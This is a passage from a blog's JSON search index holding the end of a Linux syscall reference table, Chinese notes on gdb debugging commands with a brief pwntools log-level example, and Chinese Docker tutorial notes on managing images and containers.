186 sigaltstack 0xba const struct sigaltstack *uss struct sigaltstack *uoss - - - - 187 sendfile 0xbb int out_fd int in_fd off_t *offset size_t count - - 188 getpmsg 0xbc ? ? ? ? ? ? 189 putpmsg 0xbd ? ? ? ? ? ? 190 vfork 0xbe - - - - - - 191 ugetrlimit 0xbf ? ? ? ? ? ? 192 mmap2 0xc0 ? ? ? ? ? ? 193 truncate64 0xc1 const char *path loff_t length - - - - 194 ftruncate64 0xc2 unsigned int fd loff_t length - - - - 195 stat64 0xc3 const char *filename struct stat64 *statbuf - - - - 196 lstat64 0xc4 const char *filename struct stat64 *statbuf - - - - 197 fstat64 0xc5 unsigned long fd struct stat64 *statbuf - - - - 198 lchown32 0xc6 ? ? ? ? ? ? 199 getuid32 0xc7 ? ? ? ? ? ? 200 getgid32 0xc8 ? ? ? ? ? ? 201 geteuid32 0xc9 ? ? ? ? ? ? 202 getegid32 0xca ? ? ? ? ? ? 203 setreuid32 0xcb ? ? ? ? ? ? 204 setregid32 0xcc ? ? ? ? ? ? 205 getgroups32 0xcd ? ? ? ? ? ? 206 setgroups32 0xce ? ? ? ? ? ? 207 fchown32 0xcf ? ? ? ? ? ? 208 setresuid32 0xd0 ? ? ? ? ? ? 209 getresuid32 0xd1 ? ? ? ? ? ? 210 setresgid32 0xd2 ? ? ? ? ? ? 211 getresgid32 0xd3 ? ? ? ? ? ? 212 chown32 0xd4 ? ? ? ? ? ? 213 setuid32 0xd5 ? ? ? ? ? ? 214 setgid32 0xd6 ? ? ? ? ? ? 215 setfsuid32 0xd7 ? ? ? ? ? ? 216 setfsgid32 0xd8 ? ? ? ? ? ? 217 pivot_root 0xd9 const char *new_root const char *put_old - - - - 218 mincore 0xda unsigned long start size_t len unsigned char * vec - - - 219 madvise 0xdb unsigned long start size_t len int behavior - - - 220 getdents64 0xdc unsigned int fd struct linux_dirent64 *dirent unsigned int count - - - 221 fcntl64 0xdd unsigned int fd unsigned int cmd unsigned long arg - - - 222 not implemented 0xde 223 not implemented 0xdf 224 gettid 0xe0 - - - - - - 225 readahead 0xe1 int fd loff_t offset size_t count - - - 226 setxattr 0xe2 const char *path const char *name const void *value size_t size int flags - 227 lsetxattr 0xe3 const char *path const char *name const void *value size_t size int flags - 228 fsetxattr 0xe4 int fd const char *name const void *value size_t size int flags - 229 getxattr 0xe5 const char *path const char *name void *value size_t size - - 230 lgetxattr 0xe6 const char *path const char *name void *value size_t size - - 231 fgetxattr 0xe7 int fd const char *name void *value size_t size - - 232 listxattr 0xe8 const char *path char *list size_t size - - - 233 llistxattr 0xe9 const char *path char *list size_t size - - - 234 flistxattr 0xea int fd char *list size_t size - - - 235 removexattr 0xeb const char *path const char *name - - - - 236 lremovexattr 0xec const char *path const char *name - - - - 237 fremovexattr 0xed int fd const char *name - - - - 238 tkill 0xee pid_t pid int sig - - - - 239 sendfile64 0xef int out_fd int in_fd loff_t *offset size_t count - - 240 futex 0xf0 u32 *uaddr int op u32 val struct timespec *utime u32 *uaddr2 u32 val3 241 sched_setaffinity 0xf1 pid_t pid unsigned int len unsigned long *user_mask_ptr - - - 242 sched_getaffinity 0xf2 pid_t pid unsigned int len unsigned long *user_mask_ptr - - - 243 set_thread_area 0xf3 ? ? ? ? ? ? 244 get_thread_area 0xf4 ? ? ? ? ? ? 245 io_setup 0xf5 unsigned nr_reqs aio_context_t *ctx - - - - 246 io_destroy 0xf6 aio_context_t ctx - - - - - 247 io_getevents 0xf7 aio_context_t ctx_id long min_nr long nr struct io_event *events struct timespec *timeout - 248 io_submit 0xf8 aio_context_t long struct iocb * * - - - 249 io_cancel 0xf9 aio_context_t ctx_id struct iocb *iocb struct io_event *result - - - 250 fadvise64 0xfa int fd loff_t offset size_t len int advice - - 251 not implemented 0xfb 252 exit_group 0xfc int error_code - - - - - 253 lookup_dcookie 0xfd u64 cookie64 char *buf size_t len - - - 254 epoll_create 0xfe int size - - - - - 255 epoll_ctl 0xff int epfd int op int fd struct epoll_event *event - - 256 epoll_wait 0x100 int epfd struct epoll_event *events int maxevents int timeout - - 257 remap_file_pages 0x101 unsigned long start unsigned long size unsigned long prot unsigned long pgoff unsigned long flags - 258 set_tid_address 0x102 int *tidptr - - - - - 259 timer_create 0x103 clockid_t which_clock struct sigevent *timer_event_spec timer_t * created_timer_id - - - 260 timer_settime 0x104 timer_t timer_id int flags const struct __kernel_itimerspec *new_setting struct itimerspec *old_setting - - 261 timer_gettime 0x105 timer_t timer_id struct __kernel_itimerspec *setting - - - - 262 timer_getoverrun 0x106 timer_t timer_id - - - - - 263 timer_delete 0x107 timer_t timer_id - - - - - 264 clock_settime 0x108 clockid_t which_clock const struct __kernel_timespec *tp - - - - 265 clock_gettime 0x109 clockid_t which_clock struct __kernel_timespec *tp - - - - 266 clock_getres 0x10a clockid_t which_clock struct __kernel_timespec *tp - - - - 267 clock_nanosleep 0x10b clockid_t which_clock int flags const struct __kernel_timespec *rqtp struct __kernel_timespec *rmtp - - 268 statfs64 0x10c const char *path size_t sz struct statfs64 *buf - - - 269 fstatfs64 0x10d unsigned int fd size_t sz struct statfs64 *buf - - - 270 tgkill 0x10e pid_t tgid pid_t pid int sig - - - 271 utimes 0x10f char *filename struct timeval *utimes - - - - 272 fadvise64_64 0x110 int fd loff_t offset loff_t len int advice - - 273 vserver 0x111 ? ? ? ? ? ? 274 mbind 0x112 unsigned long start unsigned long len unsigned long mode const unsigned long *nmask unsigned long maxnode unsigned flags 275 get_mempolicy 0x113 int *policy unsigned long *nmask unsigned long maxnode unsigned long addr unsigned long flags - 276 set_mempolicy 0x114 int mode const unsigned long *nmask unsigned long maxnode - - - 277 mq_open 0x115 const char *name int oflag umode_t mode struct mq_attr *attr - - 278 mq_unlink 0x116 const char *name - - - - - 279 mq_timedsend 0x117 mqd_t mqdes const char *msg_ptr size_t msg_len unsigned int msg_prio const struct __kernel_timespec *abs_timeout - 280 mq_timedreceive 0x118 mqd_t mqdes char *msg_ptr size_t msg_len unsigned int *msg_prio const struct __kernel_timespec *abs_timeout - 281 mq_notify 0x119 mqd_t mqdes const struct sigevent *notification - - - - 282 mq_getsetattr 0x11a mqd_t mqdes const struct mq_attr *mqstat struct mq_attr *omqstat - - - 283 kexec_load 0x11b unsigned long entry unsigned long nr_segments struct kexec_segment *segments unsigned long flags - - 284 waitid 0x11c int which pid_t pid struct siginfo *infop int options struct rusage *ru - 285 not implemented 0x11d 286 add_key 0x11e const char *_type const char *_description const void *_payload size_t plen key_serial_t destringid - 287 request_key 0x11f const char *_type const char *_description const char *_callout_info key_serial_t destringid - - 288 keyctl 0x120 int cmd unsigned long arg2 unsigned long arg3 unsigned long arg4 unsigned long arg5 - 289 ioprio_set 0x121 int which int who int ioprio - - - 290 ioprio_get 0x122 int which int who - - - - 291 inotify_init 0x123 - - - - - - 292 inotify_add_watch 0x124 int fd const char *path u32 mask - - - 293 inotify_rm_watch 0x125 int fd __s32 wd - - - - 294 migrate_pages 0x126 pid_t pid unsigned long maxnode const unsigned long *from const unsigned long *to - - 295 openat 0x127 int dfd const char *filename int flags umode_t mode - - 296 mkdirat 0x128 int dfd const char * pathname umode_t mode - - - 297 mknodat 0x129 int dfd const char * filename umode_t mode unsigned dev - - 298 fchownat 0x12a int dfd const char *filename uid_t user gid_t group int flag - 299 futimesat 0x12b int dfd const char *filename struct timeval *utimes - - - 300 fstatat64 0x12c int dfd const char *filename struct stat64 *statbuf int flag - - 301 unlinkat 0x12d int dfd const char * pathname int flag - - - 302 renameat 0x12e int olddfd const char * oldname int newdfd const char * newname - - 303 linkat 0x12f int olddfd const char *oldname int newdfd const char *newname int flags - 304 symlinkat 0x130 const char * oldname int newdfd const char * newname - - - 305 readlinkat 0x131 int dfd const char *path char *buf int bufsiz - - 306 fchmodat 0x132 int dfd const char * filename umode_t mode - - - 307 faccessat 0x133 int dfd const char *filename int mode - - - 308 pselect6 0x134 int fd_set * fd_set * fd_set * struct timespec * void * 309 ppoll 0x135 struct pollfd * unsigned int struct timespec * const sigset_t * size_t - 310 unshare 0x136 unsigned long unshare_flags - - - - - 311 set_robust_list 0x137 struct robust_list_head *head size_t len - - - - 312 get_robust_list 0x138 int pid struct robust_list_head * *head_ptr size_t *len_ptr - - - 313 splice 0x139 int fd_in loff_t *off_in int fd_out loff_t *off_out size_t len unsigned int flags 314 sync_file_range 0x13a int fd loff_t offset loff_t nbytes unsigned int flags - - 315 tee 0x13b int fdin int fdout size_t len unsigned int flags - - 316 vmsplice 0x13c int fd const struct iovec *iov unsigned long nr_segs unsigned int flags - - 317 move_pages 0x13d pid_t pid unsigned long nr_pages const void * *pages const int *nodes int *status int flags 318 getcpu 0x13e unsigned *cpu unsigned *node struct getcpu_cache *cache - - - 319 epoll_pwait 0x13f int epfd struct epoll_event *events int maxevents int timeout const sigset_t *sigmask size_t sigsetsize 320 utimensat 0x140 int dfd const char *filename struct timespec *utimes int flags - - 321 signalfd 0x141 int ufd sigset_t *user_mask size_t sizemask - - - 322 timerfd_create 0x142 int clockid int flags - - - - 323 eventfd 0x143 unsigned int count - - - - - 324 fallocate 0x144 int fd int mode loff_t offset loff_t len - - 325 timerfd_settime 0x145 int ufd int flags const struct __kernel_itimerspec *utmr struct __kernel_itimerspec *otmr - - 326 timerfd_gettime 0x146 int ufd struct __kernel_itimerspec *otmr - - - - 327 signalfd4 0x147 int ufd sigset_t *user_mask size_t sizemask int flags - - 328 eventfd2 0x148 unsigned int count int flags - - - - 329 epoll_create1 0x149 int flags - - - - - 330 dup3 0x14a unsigned int oldfd unsigned int newfd int flags - - - 331 pipe2 0x14b int *fildes int flags - - - - 332 inotify_init1 0x14c int flags - - - - - 333 preadv 0x14d unsigned long fd const struct iovec *vec unsigned long vlen unsigned long pos_l unsigned long pos_h - 334 pwritev 0x14e unsigned long fd const struct iovec *vec unsigned long vlen unsigned long pos_l unsigned long pos_h - 335 rt_tgsigqueueinfo 0x14f pid_t tgid pid_t pid int sig siginfo_t *uinfo - - 336 perf_event_open 0x150 struct perf_event_attr *attr_uptr pid_t pid int cpu int group_fd unsigned long flags - 337 recvmmsg 0x151 int fd struct mmsghdr *msg unsigned int vlen unsigned flags struct timespec *timeout - 338 fanotify_init 0x152 unsigned int flags unsigned int event_f_flags - - - - 339 fanotify_mark 0x153 int fanotify_fd unsigned int flags u64 mask int fd const char *pathname - 340 prlimit64 0x154 pid_t pid unsigned int resource const struct rlimit64 *new_rlim struct rlimit64 *old_rlim - - 341 name_to_handle_at 0x155 int dfd const char *name struct file_handle *handle int *mnt_id int flag - 342 open_by_handle_at 0x156 int mountdirfd struct file_handle *handle int flags - - - 343 clock_adjtime 0x157 clockid_t which_clock struct timex *tx - - - - 344 syncfs 0x158 int fd - - - - - 345 sendmmsg 0x159 int fd struct mmsghdr *msg unsigned int vlen unsigned flags - - 346 setns 0x15a int fd int nstype - - - - 347 process_vm_readv 0x15b pid_t pid const struct iovec *lvec unsigned long liovcnt const struct iovec *rvec unsigned long riovcnt unsigned long flags 348 process_vm_writev 0x15c pid_t pid const struct iovec *lvec unsigned long liovcnt const struct iovec *rvec unsigned long riovcnt unsigned long flags 349 kcmp 0x15d pid_t pid1 pid_t pid2 int type unsigned long idx1 unsigned long idx2 - 350 finit_module 0x15e int fd const char *uargs int flags - - - 351 sched_setattr 0x15f pid_t pid struct sched_attr *attr unsigned int flags - - - 352 sched_getattr 0x160 pid_t pid struct sched_attr *attr unsigned int size unsigned int flags - - 353 renameat2 0x161 int olddfd const char *oldname int newdfd const char *newname unsigned int flags - 354 seccomp 0x162 unsigned int op unsigned int flags const char *uargs - - - 355 getrandom 0x163 char *buf size_t count unsigned int flags - - - 356 memfd_create 0x164 const char *uname_ptr unsigned int flags - - - - 357 bpf 0x165 int cmd union bpf_attr *attr unsigned int size - - - 358 execveat 0x166 int dfd const char *filename const char *const *argv const char *const *envp int flags - 359 socket 0x167 int int int - - - 360 socketpair 0x168 int int int int * - - 361 bind 0x169 int struct sockaddr * int - - - 362 connect 0x16a int struct sockaddr * int - - - 363 listen 0x16b int int - - - - 364 accept4 0x16c int struct sockaddr * int * int - - 365 getsockopt 0x16d int fd int level int optname char *optval int *optlen - 366 setsockopt 0x16e int fd int level int optname char *optval int optlen - 367 getsockname 0x16f int struct sockaddr * int * - - - 368 getpeername 0x170 int struct sockaddr * int * - - - 369 sendto 0x171 int void * size_t unsigned struct sockaddr * int 370 sendmsg 0x172 int fd struct user_msghdr *msg unsigned flags - - - 371 recvfrom 0x173 int void * size_t unsigned struct sockaddr * int * 372 recvmsg 0x174 int fd struct user_msghdr *msg unsigned flags - - - 373 shutdown 0x175 int int - - - - 374 userfaultfd 0x176 int flags - - - - - 375 membarrier 0x177 int cmd int flags - - - - 376 mlock2 0x178 unsigned long start size_t len int flags - - - 377 copy_file_range 0x179 int fd_in loff_t *off_in int fd_out loff_t *off_out size_t len unsigned int flags 378 preadv2 0x17a unsigned long fd const struct iovec *vec unsigned long vlen unsigned long pos_l unsigned long pos_h rwf_t flags 379 pwritev2 0x17b unsigned long fd const struct iovec *vec unsigned long vlen unsigned long pos_l unsigned long pos_h rwf_t flags 380 pkey_mprotect 0x17c unsigned long start size_t len unsigned long prot int pkey - - 381 pkey_alloc 0x17d unsigned long flags unsigned long init_val - - - - 382 pkey_free 0x17e int pkey - - - - - 383 statx 0x17f int dfd const char *path unsigned flags unsigned mask struct statx *buffer - 384 arch_prctl 0x180 ? ? ? ? ? ? x86_64 Syscall table","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://example.com/tags/pwn/"}]},{"title":"gdb命令使用","slug":"gdb命令使用","date":"2025-06-05T12:10:46.000Z","updated":"2025-06-11T06:48:37.787Z","comments":true,"path":"2025/06/05/gdb命令使用/","permalink":"http://example.com/2025/06/05/gdb%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/","excerpt":"在程序编译时增加-g选项以支持gdb调试 如： $ gcc -g example.c -o example.x 通过上述命令对example.c编译之后，使用下列命令进入到gdb调试： $ gdb example.x 在gdb调试中，常用的命令有以下几个： $ list 缩略为 l 列出程序源码，每次列出10行，按回车重复运行上一命令； $ run 缩略为 r 程序开始运行，在r后可以加入程序启动参数，程序运行到断点处暂停； $ continue 缩略为 c","text":"在程序编译时增加-g选项以支持gdb调试 如： $ gcc -g example.c -o example.x 通过上述命令对example.c编译之后，使用下列命令进入到gdb调试： $ gdb example.x 在gdb调试中，常用的命令有以下几个： $ list 缩略为 l 列出程序源码，每次列出10行，按回车重复运行上一命令； $ run 缩略为 r 程序开始运行，在r后可以加入程序启动参数，程序运行到断点处暂停； $ continue 缩略为 c 程序继续运行，到下一断点处暂停； 单步调试 $ step 缩略为s $ next 缩略为 n 程序继续运行到下一断点； $ break 缩略为 b 在程序某一位置设置断点； $ info break 缩略为 i b 查看断点信息； 设置&#x2F;查看运行参数 $ set args —&#x2F;show args 加载运行中的进程进行调试(Attach to the running process to be debugged.)： $ gdb attatch pid Specifying source directories $ dir dirname … 以十六进制输出内存块数据 $ x&#x2F;28hx — 段错误调试，core文件样例 通过ulimit命令查看一下系统是否配置支持了dump core的功能。通过ulimit -c或ulimit -a，可以查看core file大小的配置情况，如果为0，则表示系统关闭了dump core；可以通过ulimit -c unlimited来打开。若发生了段错误，但没有core dump，是由于系统禁止core文件的生成。 $ gdb [exec file] [core file] 查看堆栈信息： $ bt PS：对于python程序在linux下可以使用pdb做调试！ Published by Windows Livewriter. 调试开始时，必须先载入要进行调试的程序，可以用以下两种方式： * 在启动gdb后执行以下命令： file 可执行文件路径 * 在gdb启动时就载入程序： gdb 可执行文件路径 载入程序后，接下来就是要进行断点的设置，要监视的变量的添加等工作，下面对在这个过程中常会用到的命令逐一进行介绍： * list ：显示程序中的代码，常用使用格式有： list 输出从上次调用list命令开始往后的10行程序代码。 list - 输出从上次调用list命令开始往前的10行程序代码。 list n 输出第n行附近的10行程序代码。 list function 输出函数function前后的10行程序代码。 * forward&#x2F;search ：从当前行向后查找匹配某个字符串的程序行。使用格式： forward&#x2F;search 字符串 查找到的行号将保存在$_变量中，可以用print $_命令来查看。 * reverse-search ：和forward&#x2F;search相反，向前查找字符串。使用格式同上。 * break ：在程序中设置断点，当程序运行到指定行上时，会暂停执行。使用格式： break 要设置断点的行号 * tbreak ：设置临时断点，在设置之后只起作用一次。使用格式： tbreak 要设置临时断点的行号 * clear ：和break相反，clear用于清除断点。使用格式： clear 要清除的断点所在的行号 * run ：启动程序，在run后面带上参数可以传递给正在调试的程序。 * awatch ：用来增加一个观察点(add watch)，使用格式： awatch 变量或表达式 当表达式的值发生改变或表达式的值被读取时，程序就会停止运行。 * watch ：与awatch类似用来设置观察点，但程序只有当表达式的值发生改变时才会停止运行。使用格 式： watch 变量或表达式 需要注意的是，awatch和watch都必须在程序运行的过程中设置观察点，即可运行run之后才能设置。 *** commands ：设置在遇到断点后执行特定的指令。**使用格式有： commands 设置遇到最后一个遇到的断点时要执行的命令 commands n 设置遇到断点号n时要执行的命令 注意，commands后面跟的是断点号，而不是断点所在的行号。 在输入命令后，就可以输入遇到断点后要执行的命令，每行一条命令，在输入最后一条命令后输入end就可以结束输入。 * delete ：清除断点或自动显示的表达式。使用格式： delete 断点号 * disable ：让指定断点失效。使用格式： disable 断点号列表 断点号之间用空格间隔开。 * enable ：和disable相反，恢复失效的断点。使用格式： enable 断点编号列表 * ignore ：忽略断点。使用格式： ignore 断点号 忽略次数 * condition ：设置断点在一定条件下才能生效。使用格式： condition 断点号 条件表达式 * cont&#x2F;continue ：使程序在暂停在断点之后继续运行。使用格式： cont 跳过当前断点继续运行。 cont n 跳过n次断点，继续运行。 当n为1时，cont 1即为cont。 * jump ：让程序跳到指定行开始调试。使用格式： jump 行号 *** next ：继续执行语句，但是跳过子程序的调用**。使用格式： next 执行一条语句 next n 执行n条语句 * nexti ：单步执行语句，但和next不同的是，它会跟踪到子程序的内部，但不打印出子程序内部的语句。使用格式同上。 * step ：与next类似，但是它会跟踪到子程序的内部，而且会显示子程序内部的执行情况。使用格式同上。 * stepi ：与step类似，但是比step更详细，是nexti和step的结合。使用格式同上。 * whatis ：显示某个变量或表达式的数据类型。使用格式： whatis 变量或表达式 * ptype ：和whatis类似，用于显示数据类型，但是它还可以显示typedef定义的类型等。使用格式： ptype 变量或表达式 * set ：设置程序中变量的值。使用格式： set 变量&#x3D;表达式 set 变量:&#x3D;表达式 * display ：增加要显示值的表达式。使用格式： display 表达式 * info display ：显示当前所有的要显示值的表达式。 * delete display&#x2F;undisplay ：删除要显示值的表达式。使用格式： delete display&#x2F;undisplay 表达式编号 * disable display ：暂时不显示一个要表达式的值。使用格式： disable display 表达式编号 * enable display ：与disable display相反，使用表达式恢复显示。使用格式： enable display 表达式编号 *** print ：打印变量或表达式的值。**使用格式： print 变量或表达式 表达式中有两个符号有特殊含义：$和$$。 $表示给定序号的前一个序号，$$表示给定序号的前两个序号。 如果$和$$后面不带数字，则给定序号为当前序号。 * backtrace ：打印指定个数的栈帧(stack frame)。使用格式： backtrace 栈帧个数 * frame ：打印栈帧。使用格式： frame 栈帧号 * info frame ：显示当前栈帧的详细信息。 * select-frame ：选择栈帧，选择后可以用info frame来显示栈帧信息。使用格式： select-frame 栈帧号 kill ：结束当前程序的调试。 * quit ：退出gdb。 查看内存x&#x2F;&lt;n&#x2F;f&#x2F;u&gt; n、f、u是可选的参数。 n 是一个正整数，表示显示内存的长度，也就是说从当前地址向后显示几个地址的内容。f 表示显示的格式，参见上面。如果地址所指的是字符串，那么格式可以是s，如果是指令地址，那么格式可以是i。u 表示从当前地址往后请求的字节数，如果不指定的话，GDB默认是4个bytes。u参数可以用下面的字符来代替，b表示单字节，h表示双字节，w表示四字 节，g表示八字节。当我们指定了字节长度后，GDB会从指内存定的内存地址开始，读写指定字节，并把其当作一个值取出来。 表示一个内存地址。n&#x2F;f&#x2F;u三个参数可以一起使用。例如： 命令：x&#x2F;3uh 0x54320 表示，从内存地址0x54320读取内容，h表示以双字节为一个单位，3表示三个单位，u表示按十六进制显示。 输出格式一般来说，GDB会根据变量的类型输出变量的值。但你也可以自定义GDB的输出的格式。例如，你想输出一个整数的十六进制，或是二进制来查看这个整型变量的中的位的情况。要做到这样，你可以使用GDB的数据显示格式： x 按十六进制格式显示变量。d 按十进制格式显示变量。u 按十六进制格式显示无符号整型。o 按八进制格式显示变量。t 按二进制格式显示变量。a 按十六进制格式显示变量。c 按字符格式显示变量。 s 按字符串格式显示变量 f 按浮点数格式显示变量。 i 按汇编显示 (gdb) p i$21 &#x3D; 101 (gdb) p&#x2F;a i$22 &#x3D; 0x65 (gdb) p&#x2F;c i$23 &#x3D; 101 ‘e’ (gdb) p&#x2F;f i$24 &#x3D; 1.41531145e-43 (gdb) p&#x2F;x i$25 &#x3D; 0x65 (gdb) p&#x2F;t i$26 &#x3D; 1100101 日志等级pwntools 如何设置调试等级（日志等级）pwntools 使用 context.log_level 来设置日志输出的详细程度。 ✨ 常用 log_level 选项： 等级 描述 &#39;debug&#39; 输出详细调试信息（最常用） &#39;info&#39; 默认，适合一般情况 &#39;warn&#39; 只输出警告信息 &#39;error&#39; 只输出错误信息 &#39;critical&#39; 只输出最严重的错误 &#39;silent&#39; 不输出任何日志 📌 示例：12345from pwn import *context.log_level = &#x27;debug&#x27;p = process(&#x27;./b0verfl0w&#x27;) 这会让 pwntools 输出所有发送的 payload、IO、GDB 附加信息等，非常适合调试阶段使用。 finish 执行到函数返回如果你想直接断在返回指令处，先 disas vuln 找到 ret 的地址，再设置断点：","categories":[],"tags":[]},{"title":"docker学习","slug":"docker学习","date":"2025-06-04T12:33:12.000Z","updated":"2025-06-06T04:53:15.419Z","comments":true,"path":"2025/06/04/docker学习/","permalink":"http://example.com/2025/06/04/docker%E5%AD%A6%E4%B9%A0/","excerpt":"docker打包、分发、部署打包：就是把你软件运行所需的依赖、第三方库、软件打包到一起，变成一个安装包分发：你可以把你打包好的“安装包”上传到一个镜像仓库，其他人可以非常方便的获取和安装部署：拿着“安装包”就可以一个命令运行起来你的应用，自动模拟出一摸一样的运行环境，不管是在 Windows&#x2F;Mac&#x2F;Linux。","text":"docker打包、分发、部署打包：就是把你软件运行所需的依赖、第三方库、软件打包到一起，变成一个安装包分发：你可以把你打包好的“安装包”上传到一个镜像仓库，其他人可以非常方便的获取和安装部署：拿着“安装包”就可以一个命令运行起来你的应用，自动模拟出一摸一样的运行环境，不管是在 Windows&#x2F;Mac&#x2F;Linux。 镜像加速源 镜像加速器 镜像加速器地址 Docker 中国官方镜像 https://registry.docker-cn.com DaoCloud 镜像站 http://f1361db2.m.daocloud.io Azure 中国镜像 https://dockerhub.azk8s.cn 科大镜像站 https://docker.mirrors.ustc.edu.cn 阿里云 https://ud6340vz.mirror.aliyuncs.com 七牛云 https://reg-mirror.qiniu.com 网易云 https://hub-mirror.c.163.com 腾讯云 https://mirror.ccs.tencentyun.com 1&quot;registry-mirrors&quot;: [&quot;https://registry.docker-cn.com&quot;] 软件安装 hub.docker.com Docker 常用命令镜像的管理搜索&#x2F;检索1docker search 镜像名称 示例： 1234567891011[root@docker ~]# docker search nginxNAME DESCRIPTION STARS OFFICIAL AUTOMATEDnginx Official build of Nginx. 16597 [OK]bitnami/nginx Bitnami nginx Docker Image 121 [OK]ubuntu/nginx Nginx, a high-performance reverse proxy &amp; we… 39bitnami/nginx-ingress-controller Bitnami Docker Image for NGINX Ingress Contr… 17 [OK]rancher/nginx-ingress-controller 10ibmcom/nginx-ingress-controller Docker Image for IBM Cloud Private-CE (Commu… 4bitnami/nginx-ldap-auth-daemon 3bitnami/nginx-exporter 2circleci/nginx This image is for internal use 2 默认从 Docker Hub 进行搜索镜像。 下载&#x2F;拉取1docker pull 名称:版本 示例： 1234567891011[root@docker ~]# docker pull nginx:1.21.61.21.6: Pulling from library/nginxc229119241af: Pull complete2215908dc0a2: Pull complete08c3cb2073f1: Pull complete18f38162c0ce: Pull complete10e2168f148a: Pull completec4ffe9532b5f: Pull completeDigest: sha256:2275af0f20d71b293916f1958f8497f987b8d8fd8113df54635f2a5915002bf1Status: Downloaded newer image for nginx:1.21.6docker.io/library/nginx:1.21.6 如果不加版本，则拉取 latest 版本，即最新版本。 镜像列表12docker imagesdocker image ls 示例： 123456789101112[root@docker ~]# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEnginx 1.21.6 12766a6745ee 10 days ago 142MBrancher/mirrored-flannelcni-flannel v0.17.0 9247abf08677 5 weeks ago 59.8MBrancher/mirrored-flannelcni-flannel-cni-plugin v1.0.1 ac40ce625740 2 months ago 8.1MBregistry.aliyuncs.com/google_containers/kube-apiserver v1.23.0 e6bf5ddd4098 4 months ago 135MBregistry.aliyuncs.com/google_containers/kube-controller-manager v1.23.0 37c6aeb3663b 4 months ago 125MBregistry.aliyuncs.com/google_containers/kube-scheduler v1.23.0 56c5af1d00b5 4 months ago 53.5MBregistry.aliyuncs.com/google_containers/kube-proxy v1.23.0 e03484a90585 4 months ago 112MBregistry.aliyuncs.com/google_containers/etcd 3.5.1-0 25f8c7f3da61 5 months ago 293MBregistry.aliyuncs.com/google_containers/coredns v1.8.6 a4ca41631cc7 6 months ago 46.8MBregistry.aliyuncs.com/google_containers/pause 3.6 6270bb605e12 7 months ago 683kB 五列数据分别代表镜像名称、镜像版本、镜像 ID、拉取时间、镜像大小。 镜像标签1docker tag [imagesID] 改后名称:改后tag 示例： 1234[root@docker ~]# docker tag nginx:1.21.6 mynginx:1.21.6[root@docker ~]# docker images |grep nginxmynginx 1.21.6 12766a6745ee 10 days ago 142MBnginx 1.21.6 12766a6745ee 10 days ago 142MB 镜像删除1docker rmi 镜像id 示例： 12[root@docker ~]# docker rmi mynginx:1.21.6Untagged: mynginx:1.21.6 镜像导出1docker save 镜像id/镜像名 &gt; 名字.tar 示例： 123[root@docker ~]# docker save nginx:1.21.6 &gt; nginx-v1.21.6.tar[root@docker ~]# lsnginx-v1.21.6.tar 镜像导入1docker load &lt; 包名 示例： 1234567891011121314151617181920[root@docker ~]# docker rmi nginx:1.21.6Untagged: nginx:1.21.6Untagged: nginx@sha256:2275af0f20d71b293916f1958f8497f987b8d8fd8113df54635f2a5915002bf1Deleted: sha256:12766a6745eea133de9fdcd03ff720fa971fdaf21113d4bc72b417c123b15619Deleted: sha256:3ea962f6f388096ab9798790d363fc6f9c779c924a5eddf5c699d8da080114f7Deleted: sha256:091a2aef7242e42505b69f1ad027d6a442cfce2403e260ac914f0fd6cc2d275fDeleted: sha256:4e72a31f1cd6fd655cc0826c91e886967b6e965e13ac21f31f9f66c27a3b7732Deleted: sha256:e3d1cdf9772a260b3e81a22c1940d63ac45dfe67720f78f00ca73834d9498934Deleted: sha256:af40da71a8618ea9cbcdc333d5e60bd5b6df820f0d07a55f7c9a1c21fd930095Deleted: sha256:608f3a074261105f129d707e4d9ad3d41b5baa94887f092b7c2857f7274a2fce[root@docker ~]# docker load &lt; nginx-v1.21.6.tar608f3a074261: Loading layer [==================================================&gt;] 83.9MB/83.9MBea207a4854e7: Loading layer [==================================================&gt;] 62MB/62MB33cf1b723f65: Loading layer [==================================================&gt;] 3.072kB/3.072kB5c77d760e1f4: Loading layer [==================================================&gt;] 4.096kB/4.096kBfac199a5a1a5: Loading layer [==================================================&gt;] 3.584kB/3.584kBea4bc0cd4a93: Loading layer [==================================================&gt;] 7.168kB/7.168kBLoaded image: nginx:1.21.6[root@docker ~]# docker images |grep nginxnginx 1.21.6 12766a6745ee 10 days ago 142MB 容器的管理创建容器1docker run [options] image [command] [arg] Option 说明： -d: 后台运行 -i: 以交互模式运行容器，通常与 -t 同时使用 -t: 为容器重新分配一个伪输出终端，通常与 -i 同时使用 --name: 设置容器名字 --net: 指定网络连接类型 --h: 设置主机名称 --dns: 指定容器的 DNS 服务器，默认和宿主一致 -e: 设置环境变量（&#x3D;””） -p: 本地端口:容器端口，把容器的某个端口暴露到主机的某个端口 -v: 本地目录:容器目录，把主机的某目录挂载到容器的目录里面实现文件系统的链接 --network: 指定网络 --rm: 容器关闭后自动删除 示例：使用命令 docker run -p 8080:80 -d --name nginx1 nginx 来运行一个 Nginx 容器，并且把容器的 80 端口暴露到本机的 8080： 123456789101112[root@docker ~]# docker run -p 8080:80 -d --name nginx1 nginxUnable to find image &#x27;nginx:latest&#x27; locallylatest: Pulling from library/nginx1fe172e4850f: Pull complete35c195f487df: Pull complete213b9b16f495: Pull completea8172d9e19b9: Pull completef5eee2cb2150: Pull complete93e404ba8667: Pull completeDigest: sha256:859ab6768a6f26a79bc42b231664111317d095a4f04e4b6fe79ce37b3d199097Status: Downloaded newer image for nginx:latest4cf61416ee672b595b99436d0fdcf8ebe5e6d22adaed8838b29e978f19372ecb 容器的创建过程是先到本地查找镜像，如果没有则去 Docker Hub 镜像仓库拉取镜像后再运行。 容器列表使用命令 docker ps 来查看已经启动的容器，如果有停止运行的容器可以添加 -a 参数来查看： 123[root@docker ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES4cf61416ee67 nginx &quot;/docker-entrypoint.…&quot; 3 minutes ago Up 3 minutes 0.0.0.0:8080-&gt;80/tcp, :::8080-&gt;80/tcp nginx1 关闭容器使用命令 docker stop &#123;容器ID|容器名称&#125; 来关闭容器： 1234[root@docker ~]# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES4cf61416ee67 nginx &quot;/docker-entrypoint.…&quot; 6 minutes ago Exited (0) 4 seconds ago nginx158e6c5af6efe hello-world &quot;/hello&quot; 12 hours ago Exited (0) 12 hours ago great_chatterjee 启动容器使用命令 docker start &#123;容器ID|容器名称&#125; 来开启容器： 123[root@docker ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES4cf61416ee67 nginx 